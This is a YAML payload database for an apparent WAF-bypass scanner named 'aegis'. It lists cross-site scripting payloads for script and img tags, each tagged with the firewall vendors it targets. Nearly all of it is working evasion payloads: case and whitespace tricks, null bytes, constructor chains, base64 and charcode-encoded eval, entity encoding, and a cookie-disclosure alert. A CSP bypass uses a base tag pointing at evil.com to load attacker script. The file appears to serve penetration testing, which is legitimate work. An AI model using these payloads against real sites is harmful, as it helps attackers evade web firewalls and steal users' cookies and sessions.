# ==============================================================================
# WAF Bypass Payload Database v1.0
# ==============================================================================
# Comprehensive payload database for WAF bypass testing
# Organized by element type, WAF vendor, and encoding technique
#
# Usage:
#   aegis scan --waf-bypass --target https://example.com
#   aegis scan --waf-type cloudflare --element-focus script,img
#
# Last Updated: 2026-02-05
# ==============================================================================

version: "1.0"
last_updated: "2026-02-05"

# ==============================================================================
# SCRIPT TAG PAYLOADS
# ==============================================================================
script_payloads:
  basic:
    - value: '<script>alert(1)</script>'
      description: "Basic script alert"
      confidence: 30

    - value: '<script>alert(document.domain)</script>'
      description: "Domain disclosure"
      confidence: 30

    - value: '<script>alert(document.cookie)</script>'
      description: "Cookie disclosure"
      confidence: 30

  waf_bypass:
    # Case variation
    - value: '<ScRiPt>alert(1)</ScRiPt>'
      description: "Mixed case bypass"
      confidence: 50
      targets: [modsecurity, nginx-naxsi]

    - value: '<SCRIPT>alert(1)</SCRIPT>'
      description: "Uppercase bypass"
      confidence: 50

    # Whitespace injection
    - value: '<script >alert(1)</script>'
      description: "Space after tag"
      confidence: 55

    - value: '<script\t>alert(1)</script>'
      description: "Tab whitespace bypass"
      confidence: 60
      targets: [cloudflare, akamai]

    - value: '<script\n>alert(1)</script>'
      description: "Newline whitespace"
      confidence: 60

    - value: '<script\r>alert(1)</script>'
      description: "CR whitespace"
      confidence: 60

    - value: '<script\x0c>alert(1)</script>'
      description: "Form feed whitespace"
      confidence: 65

    # Comment insertion
    - value: '<script>/**/alert(1)</script>'
      description: "Empty comment bypass"
      confidence: 55

    - value: '<script>alert/*comment*/(1)</script>'
      description: "Comment in function call"
      confidence: 60
      targets: [modsecurity]

    # Tag breaking
    - value: '</script><script>alert(1)</script>'
      description: "Close and reopen tag"
      confidence: 65

    - value: '<script>alert(1)</script//>'
      description: "Double slash close"
      confidence: 50

    # Null byte injection
    - value: '<scr\x00ipt>alert(1)</scr\x00ipt>'
      description: "Null byte in tag"
      confidence: 65
      targets: [modsecurity, nginx-naxsi, wordfence]

    # SVG wrapper
    - value: '<svg><script>alert(1)</script></svg>'
      description: "SVG wrapped script"
      confidence: 70
      targets: [cloudflare, akamai]

    # Template literals
    - value: '<script>alert`1`</script>'
      description: "Template literal call"
      confidence: 70
      targets: [akamai, cloudflare, imperva]

    - value: '<script>alert`${document.domain}`</script>'
      description: "Template literal with expression"
      confidence: 70

    # Constructor chain
    - value: '<script>[].constructor.constructor("alert(1)")()</script>'
      description: "Array constructor chain"
      confidence: 75
      targets: [cloudflare, akamai, imperva]

    - value: '<script>"".constructor.constructor("alert(1)")()</script>'
      description: "String constructor chain"
      confidence: 75

    - value: '<script>window["al"+"ert"](1)</script>'
      description: "String concatenation"
      confidence: 60

    - value: '<script>window["eval"]("alert(1)")</script>'
      description: "Bracket notation eval"
      confidence: 65

    # Encoded variants
    - value: '<script>eval(atob("YWxlcnQoMSk="))</script>'
      description: "Base64 encoded payload"
      confidence: 65

    - value: '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'
      description: "CharCode encoded"
      confidence: 70
      targets: [cloudflare, akamai]

  csp_bypass:
    - value: '<script src="/api?callback=alert"></script>'
      description: "JSONP callback injection"
      confidence: 50

    - value: '<base href="//evil.com/"><script src="/safe.js"></script>'
      description: "Base tag hijacking"
      confidence: 55

    - value: '<script nonce="{{nonce}}">alert(1)</script>'
      description: "Nonce placeholder"
      confidence: 30

# ==============================================================================
# IMG TAG PAYLOADS
# ==============================================================================
img_payloads:
  basic:
    - value: '<img src=x onerror=alert(1)>'
      description: "Basic img onerror"
      confidence: 35

    - value: '<img src=x onerror="alert(1)">'
      description: "Quoted onerror"
      confidence: 35

    - value: '<img/src=x onerror=alert(1)>'
      description: "Slash separator"
      confidence: 40

  waf_bypass:
    # Slash tricks
    - value: '<img/src/onerror=alert(1)>'
      description: "Double slash trick"
      confidence: 60
      targets: [modsecurity, nginx-naxsi]

    - value: '<img src=x\tonerror=alert(1)>'
      description: "Tab separator"
      confidence: 65

    # Backtick call
    - value: '<img src=x onerror=alert`1`>'
      description: "Backtick function call"
      confidence: 70
      targets: [cloudflare, akamai, imperva]

    # HTML entity encoding
    - value: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>'
      description: "Decimal HTML entities"
      confidence: 70
      targets: [akamai, cloudflare]

    - value: '<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>'
      description: "Hex HTML entities"
      confidence: 70

    - value: '<img src=x onerror=\u0061lert(1)>'
      description: "Unicode escape sequence"
      confidence: 65

    # Mixed quotes
    - value: "<img src='x' onerror=\"alert(1)\">"
      description: "Mixed quote styles"
      confidence: 50

    - value: '<img src=x onerror=alert(1)//>'
      description: "Comment close trick"
      confidence: 55

    # SVG image
    - value: '<svg><image xlink:href=x onerror=alert(1)>'
      description: "SVG image element"
      confidence: 70
      targets: [cloudflare]

    # Data URL
    - value: '<img src="data:x,x" onerror=alert(1)>'
      description: "Data URL error trigger"
      confidence: 55

    # Loading attribute
    - value: '<img loading=lazy src=x onerror=alert(1)>'
      description: "Lazy loading with error"
      confidence: 50

    # Filter evasion
    - value: '<<img src=x onerror=alert(1)>'
      description: "Double bracket"
      confidence: 55

    - value: '<img/src="x"/onerror="alert(1)">'
      description: "Slash quoted attributes"
      confidence: 50

    # Constructor bypass
    - value: '<img src=x onerror=window.onerror=alert;throw+1>'
      description: "Window onerror assignment"
      confidence: 65

    - value: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>'
      description: "Base64 in onerror"
      confidence: 70

    # Animation events
    - value: '<img src=x style="animation:x" onanimationend=alert(1)>'
      description: "CSS animation event"
      confidence: 60

